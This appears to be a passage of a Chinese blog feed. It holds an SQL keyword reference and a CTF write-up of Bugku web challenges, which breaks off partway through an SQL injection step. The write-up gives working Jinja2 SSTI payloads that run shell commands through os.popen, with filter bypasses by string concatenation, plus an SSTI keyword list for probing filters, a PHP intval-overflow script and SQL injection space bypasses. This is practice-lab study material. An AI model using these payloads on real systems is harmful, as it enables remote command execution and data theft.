    <published>2025-11-23T16:00:00.000Z</published>
    <updated>2025-12-07T13:14:23.821Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SQL"><a href="#什么是SQL" class="headerlink" title="什么是SQL"></a>什么是SQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SQL 指结构化查询语言，全称是 Structured Query Language。</span><br><span class="line"></span><br><span class="line">SQL 让您可以访问和处理数据库，包括数据插入、查询、更新和删除。</span><br><span class="line"></span><br><span class="line">SQL 语言采用英语关键词，使其易读易写。</span><br><span class="line"></span><br><span class="line">SQL 由国际标准化组织（ISO）和美国国家标准协会（ANSI）标准化。</span><br><span class="line"></span><br><span class="line">SQL 提供了丰富的操作数据的功能，从简单的查询到复杂的数据库管理操作。</span><br></pre></td></tr></table></figure><h2 id="SQL能干什么"><a href="#SQL能干什么" class="headerlink" title="SQL能干什么"></a>SQL能干什么</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SQL 面向数据库执行查询</span><br><span class="line"></span><br><span class="line">SQL 可从数据库取回数据</span><br><span class="line"></span><br><span class="line">SQL 可在数据库中插入新的记录</span><br><span class="line"></span><br><span class="line">SQL 可更新数据库中的数据</span><br><span class="line"></span><br><span class="line">SQL 可从数据库删除记录</span><br><span class="line"></span><br><span class="line">SQL 可创建新数据库</span><br><span class="line"></span><br><span class="line">SQL 可在数据库中创建新表</span><br><span class="line"></span><br><span class="line">SQL 可在数据库中创建存储过程</span><br><span class="line"></span><br><span class="line">SQL 可在数据库中创建视图</span><br><span class="line"></span><br><span class="line">SQL 可以设置表、存储过程和视图的权限</span><br></pre></td></tr></table></figure><h2 id="SQL关键字"><a href="#SQL关键字" class="headerlink" title="SQL关键字"></a>SQL关键字</h2><h3 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h3><p>用于从数据库中查询数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM table_name WHERE condition</span><br><span class="line"></span><br><span class="line">column_name：列名</span><br><span class="line">table_name：表名</span><br><span class="line">condition：查询条件</span><br></pre></td></tr></table></figure><h3 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h3><p>用于指定筛选条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM table_name WHERE condition</span><br></pre></td></tr></table></figure><h3 id="INSERT-INTO"><a href="#INSERT-INTO" class="headerlink" title="INSERT INTO"></a>INSERT INTO</h3><p>用于向数据库表中插入新数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name (column1, column2, ...) VALUES (value1, value2, ...)</span><br><span class="line"></span><br><span class="line">column：列</span><br><span class="line">value：对应列的值。</span><br></pre></td></tr></table></figure><h3 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h3><p>用于更新数据库表中的现有数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition</span><br></pre></td></tr></table></figure><h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><p>用于从数据库表中删除数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM table_name WHERE condition</span><br></pre></td></tr></table></figure><h3 id="CREATE-TABLE"><a href="#CREATE-TABLE" class="headerlink" title="CREATE TABLE"></a>CREATE TABLE</h3><p>用于创建新的数据库表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name (column1 data_type constraint, column2 data_type constraint, ...)</span><br><span class="line"></span><br><span class="line">data_type: 列的数据类型（如 INT、VARCHAR 等）。</span><br><span class="line">constraint: 列的约束（如 PRIMARY KEY、NOT NULL 等）。</span><br></pre></td></tr></table></figure><h3 id="ALTER-TABLE"><a href="#ALTER-TABLE" class="headerlink" title="ALTER TABLE"></a>ALTER TABLE</h3><p>用于修改现有数据库表的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ADD column_name data_type</span><br><span class="line">或：</span><br><span class="line">ALTER TABLE table_name DROP COLUMN column_name</span><br></pre></td></tr></table></figure><h3 id="DROP-TABLE"><a href="#DROP-TABLE" class="headerlink" title="DROP TABLE"></a>DROP TABLE</h3><p>用于删除数据库表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE table_name</span><br></pre></td></tr></table></figure><h3 id="CREATE-INDEX"><a href="#CREATE-INDEX" class="headerlink" title="CREATE INDEX"></a>CREATE INDEX</h3><p>用于创建索引，以加快查询速度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE INDEX index_name ON table_name (column_name)</span><br><span class="line"></span><br><span class="line">index_name：索引的名称</span><br></pre></td></tr></table></figure><h3 id="DROP-INDEX"><a href="#DROP-INDEX" class="headerlink" title="DROP INDEX"></a>DROP INDEX</h3><p>用于删除索引</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP INDEX index_name ON table_name</span><br></pre></td></tr></table></figure><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><p>用于对结果集进行排序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name ORDER BY column_name [ASC|DESC]</span><br><span class="line"></span><br><span class="line">ASC: 升序（默认）。</span><br><span class="line">DESC: 降序。</span><br></pre></td></tr></table></figure><h3 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h3><p>用于将结果集按一列或多列进行分组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s), aggregate_function(column_name) FROM table_name WHERE condition GROUP BY column_name(s)</span><br></pre></td></tr></table></figure><h3 id="GROUP-CONCAT"><a href="#GROUP-CONCAT" class="headerlink" title="GROUP_CONCAT"></a>GROUP_CONCAT</h3><p>将一个分组内指定列的所有值连接成一个单一的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database()</span><br></pre></td></tr></table></figure><h3 id="HAVING"><a href="#HAVING" class="headerlink" title="HAVING"></a>HAVING</h3><p>用于对分组后的结果集进行筛选。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s), aggregate_function(column_name) FROM table_name GROUP BY column_name(s) HAVING condition</span><br></pre></td></tr></table></figure><h3 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h3><p>用于将两个或多个表的记录结合起来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table_name1 JOIN table_name2 ON table_name1.column_name = table_name2.column_name</span><br><span class="line"></span><br><span class="line">JOIN: 可以是 INNER JOIN、LEFT JOIN、RIGHT JOIN 或 FULL JOIN。</span><br></pre></td></tr></table></figure><h3 id="DISTINCT"><a href="#DISTINCT" class="headerlink" title="DISTINCT"></a>DISTINCT</h3><p>用于返回唯一不同的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT column_name(s) FROM table_name</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;什么是SQL&quot;&gt;&lt;a href=&quot;#什么是SQL&quot; class=&quot;headerlink&quot; title=&quot;什么是SQL&quot;&gt;&lt;/a&gt;什么是SQL&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="note" scheme="https://aihenai.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>Bugku平台刷题题解1</title>
    <link href="https://aihenai.github.io/2025/11/23/11.17-11.23bugku/"/>
    <id>https://aihenai.github.io/2025/11/23/11.17-11.23bugku/</id>
    <published>2025-11-22T16:00:00.000Z</published>
    <updated>2025-12-07T13:48:04.346Z</updated>
    
    <content type="html"><![CDATA[<h2 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h2><p>11.17-11.23</p><h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>1、题目已经声明为ssti，打开后传参?search&#x3D;49也可以确定</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123093406091.png"></p><p>2、然后进行逐个尝试，发现很多字符都被过滤，比如class、init、globals等</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123093525489.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123093658884.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123093711660.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123093722036.png"></p><p>3、我们使用字符串拼接进行绕过，依次传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、?search=&#123;&#123;config[&#x27;_&#x27;&#x27;_&#x27;&#x27;c&#x27;&#x27;l&#x27;&#x27;a&#x27;&#x27;s&#x27;&#x27;s&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;i&#x27;&#x27;n&#x27;&#x27;i&#x27;&#x27;t&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;g&#x27;&#x27;l&#x27;&#x27;o&#x27;&#x27;b&#x27;&#x27;a&#x27;&#x27;l&#x27;&#x27;s&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">2、?search=&#123;&#123;config[&#x27;_&#x27;&#x27;_&#x27;&#x27;c&#x27;&#x27;l&#x27;&#x27;a&#x27;&#x27;s&#x27;&#x27;s&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;i&#x27;&#x27;n&#x27;&#x27;i&#x27;&#x27;t&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_&#x27;&#x27;g&#x27;&#x27;l&#x27;&#x27;o&#x27;&#x27;b&#x27;&#x27;a&#x27;&#x27;l&#x27;&#x27;s&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;os&#x27;].popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123094333021.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123094237827.png"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、遇到被ban的字符时可以使用[&#x27;o&#x27;&#x27;s&#x27;]或者[&#x27;o&#x27;+&#x27;s&#x27;]或者[&#x27;o&#x27;~&#x27;s&#x27;]进行拼接绕过</span><br></pre></td></tr></table></figure><h2 id="SSTI-0"><a href="#SSTI-0" class="headerlink" title="SSTI 0"></a>SSTI 0</h2><p>1、题目同样已经说明是ssti，进去后传入49一样可以确定，参数在进入后可以知道是name</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123094758479.png"></p><p>2、防止有过滤，一个个测试过去，发现没有，直接可以读取，传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__.os.popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123094915915.png"></p><p>有回显，但是并没有看到flag（其实bin前面一个SSTI根目录，flag就在里面，但是老眼昏花没看见）</p><p>3、修改传参内的ls命令为find命令寻找flag位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__.os.popen(&#x27;find / -name &quot;flag*&quot; 2&gt;/dev/null&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>成功找到了flag位置</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123095232287.png"></p><p>4、cat命令获取flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__.os.popen(&#x27;cat /sys/devices/platform/serial8250/tty/ttyS3/flags /SSTI/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123095506813.png"></p><h2 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h2><p>1、打开题目后看到几个文件，其中有个压缩包，先点一下下载下来</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123095943282.png"></p><p>2、下完打开后发现是git文件，感觉可能要寻找前面的日志内容，于是转虚拟机又下了一遍，然后解压</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123100024642.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123100652471.png"></p><p>3、解压后使用git log查看历史</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123100726802.png"></p><p>4、get show逐个查看，在第一个就找到了flag</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123100826041.png"></p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git log查看当前 Git 仓库的提交历史</span><br><span class="line">git show显示某次提交的详细信息，默认显示最新的一次提交</span><br><span class="line">wget -r 地址递归下载一个网站或目录</span><br></pre></td></tr></table></figure><h2 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h2><p>1、打开发现是计算题，但是数额明显巨大，手算是不可能的，考虑脚本或者特性；其次在查看源码时给了提示，源码泄露，于是dirsearch扫了一下发现有.bak文件，下载查看</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123101309915.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123101322013.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123101259323.png"></p><p>2、下载.bak文件后得到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_SESSION[&#x27;ans&#x27;]) &amp;&amp; isset($_POST[&#x27;ans&#x27;]))&#123;</span><br><span class="line">if(($_SESSION[&#x27;ans&#x27;])+intval($_POST[&#x27;input&#x27;])!=$_POST[&#x27;ans&#x27;])&#123;</span><br><span class="line">session_destroy();</span><br><span class="line">echo &#x27;</span><br><span class="line">&lt;script language=&quot;javascript&quot;&gt;  </span><br><span class="line">alert(&quot;怎么没算对呢？&quot;);  </span><br><span class="line">window.history.back(-1);  &lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if(intval(time())-$_SESSION[&#x27;time&#x27;]&lt;1)&#123;</span><br><span class="line">session_destroy();</span><br><span class="line">echo &#x27;</span><br><span class="line">&lt;script language=&quot;javascript&quot;&gt;  </span><br><span class="line">alert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  </span><br><span class="line">window.history.back(-1); &lt;/script&gt; &#x27;;</span><br><span class="line">&#125;</span><br><span class="line">if(intval(time())-$_SESSION[&#x27;time&#x27;]&gt;2)&#123;</span><br><span class="line">session_destroy();</span><br><span class="line">echo &#x27;</span><br><span class="line">&lt;script language=&quot;javascript&quot;&gt;  </span><br><span class="line">alert(&quot;你算的太慢了少年！&quot;);  </span><br><span class="line">window.history.back(-1); &lt;/script&gt; &#x27;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;</span><br><span class="line">&lt;script language=&quot;javascript&quot;&gt;  </span><br><span class="line">alert(&quot;tql，算对了！！&quot;);  </span><br><span class="line">     &lt;/script&gt; &#x27;;</span><br><span class="line">$_SESSION[&#x27;count&#x27;]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>没有看到有直接输出flag的，但是有次数的增加，那应该是需要积累次数到一定数值会输出flag；这个计算的判定是要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($_SESSION[&#x27;ans&#x27;])+intval($_POST[&#x27;input&#x27;])=$_POST[&#x27;ans&#x27;]</span><br></pre></td></tr></table></figure><p>而intval有个特性是输入值超过最大值时会被截断为最大值，所以我们只需要写一个脚本，先获取SESSION[‘ans’]的值，然后给intval($POST[‘input’])一个超过最大值的数，比如1111111111111111111111（不写科学技术法，比如1e22，会被intval错误解析为1，然后脚本一直发送，服务武器一直错误解析为1然后一直生成新的SESSION[‘ans’]，脚本得不到结束的信息就会导致两者之间陷入死循环），然后给$POST[‘ans’]定义为最大值加上获取到的SESSION[‘ans’]的值，再控制一下传入时间，自动循环跑，直至出flag就可以了，脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url=&quot;http://49.232.142.230:14235/&quot;</span><br><span class="line">cookies=&#123;&quot;PHPSESSID&quot;: &quot;bohuhj0odvcfopngpolcigp5n2&quot;&#125;</span><br><span class="line">re = session.get(url)</span><br><span class="line">num = &quot;1111111111111111111111&quot;</span><br><span class="line">num_intval=&quot;9223372036854775807&quot;</span><br><span class="line"></span><br><span class="line">while(1):</span><br><span class="line">    soup = BeautifulSoup(re.text, &#x27;html.parser&#x27;)</span><br><span class="line">    div_tags = soup.find_all(&#x27;div&#x27;, &#123;&#x27;style&#x27;: &#x27;display:inline;&#x27;&#125;)</span><br><span class="line">    calc = &quot;&quot;</span><br><span class="line">    if div_tags:</span><br><span class="line">        for div_tag in div_tags:</span><br><span class="line">            calc += div_tag.text</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未找到目标标签&quot;)</span><br><span class="line">        exit(0)</span><br><span class="line">    data=&#123;&quot;input&quot;: num, &quot;ans&quot;: eval(num_intval+calc[:-1])&#125;</span><br><span class="line">    re = session.post(url=url,cookies=cookies,data=data)</span><br><span class="line">    if re.status_code != 200:</span><br><span class="line">        print(&#x27;fail&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line">    if &quot;nctf&quot; in re.text:</span><br><span class="line">        print(re.text)</span><br><span class="line">    time.sleep(1)</span><br></pre></td></tr></table></figure><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123111605975.png"></p><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">intval()PHP 编程语言中用于获取变量的整数值的函数</span><br><span class="line">dirsearchPython 编写的命令行式的Web路径扫描器，常用命令形式为python dirsearch.py -u 网址</span><br><span class="line">.bak文件常见的备份文件扩展名，在题目中常常包含关于解题的信息</span><br></pre></td></tr></table></figure><h2 id="Flask-PLUS"><a href="#Flask-PLUS" class="headerlink" title="Flask PLUS"></a>Flask PLUS</h2><p>1、题目写明是flask，那可能有ssti漏洞，进去之后没有看到什么有用的信息，只有右下角有可以切换的页面，尝试切换</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123113119383.png"></p><p>2、切换页面后一直没想到有什么注入点，搜了之后才知道这个报错是把url直接贴出来了，所以注入点就在url里面，直接输入49，输出了49，确定</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123113231718.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123113416717.png"></p><p>3、找到了注入点就开始一个个字符尝试，看看有没有过滤，发现过滤了很多，比如config、class、init等，找了一个ssti常见字符的txt文本，用bp批量尝试之后，找到了一些没被过滤的字符，323的都是被ban的字符，响应头里面都是Y0u_Ar3_Hacker</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123115216470.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123115257055.png"></p><p>4、那我们在其他剩余的字符里面找字符，再用字符串拼接的方式绕过几个关键的字符就可以拼凑payload了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;o&#x27;&#x27;s&#x27;][&#x27;pop&#x27;&#x27;en&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123115713253.png"></p><p>修改ls &#x2F;为cat &#x2F;Th1s_is__F1114g即可获取flag</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123115800843.png"></p><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">对于过滤字符比较多的题目，可以跟爆破密码一样对其进行爆破，字符表如下：</span><br><span class="line">.</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">_</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#123;&#123;</span><br><span class="line">&#125;&#125;</span><br><span class="line">&#123;%</span><br><span class="line">%&#125;</span><br><span class="line">&#123;%if</span><br><span class="line">&#123;%endif</span><br><span class="line">&#123;%print(</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">0</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">+</span><br><span class="line">%20</span><br><span class="line">%2B</span><br><span class="line">%2b</span><br><span class="line">join()</span><br><span class="line">u</span><br><span class="line">os</span><br><span class="line">popen</span><br><span class="line">importlib</span><br><span class="line">linecache</span><br><span class="line">subprocess</span><br><span class="line">|attr()</span><br><span class="line">request</span><br><span class="line">args</span><br><span class="line">value</span><br><span class="line">cookie</span><br><span class="line">__getitem__()</span><br><span class="line">__class__</span><br><span class="line">__base__</span><br><span class="line">__bases__</span><br><span class="line">__mro__</span><br><span class="line">__subclasses__()</span><br><span class="line">__builtins__</span><br><span class="line">__init__</span><br><span class="line">__globals__</span><br><span class="line">__import__</span><br><span class="line">__dic__</span><br><span class="line">__getattribute__()</span><br><span class="line">__getitem__()</span><br><span class="line">__str__()</span><br><span class="line">lipsum</span><br><span class="line">current_app</span><br></pre></td></tr></table></figure><h2 id="flask真香"><a href="#flask真香" class="headerlink" title="flask真香"></a>flask真香</h2><p>这题因为已经写过plus版本了，所以plus版本里面的payload直接拿来用就成功过关了，具体的步骤可以直接用plus版本里面的</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123120003784.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123120026382.png"></p><h2 id="滴-晨跑打卡"><a href="#滴-晨跑打卡" class="headerlink" title="滴!晨跑打卡"></a>滴!晨跑打卡</h2><p>1、进入题目后发现是一个查询框，可能是sql注入，输入1’，发现报错，报错信息显示确实是sql，并且还把sql语句直接显示了出来</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123143959766.png"></p><p>2、输入1’ UNION SELECT 1,2,3 ‘想获取信息，但是发现被过滤，于是开始一个个尝试，发现1’UNION’可行，但是1’UNION SELECT’不可行，考虑SELECT被过滤，但是尝试1’SELECT’后发现可行，对比三者，感觉应该是空格被过滤</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123144055744.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123144519435.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123144535383.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123144455525.png"></p><p>3、尝试将空格进行url编码后绕过，输入1’UNION%a0SELECT%a01,2,3’，发现可行</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123144823027.png"></p><p>4、在尝试payload的时候，发现#与-都被过滤，只能用’进行闭合，且这个url里面有个id参数，用于提交在搜索框提交的信息，但是不知道为什么，1’%a0union%a0select%a01,2,’3这种的，在搜索框里面传行不通，但是直接给id这个get参数却可以执行，可能是解码的问题，于是后续改为直接给id传</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123152347157.png"></p><p><img 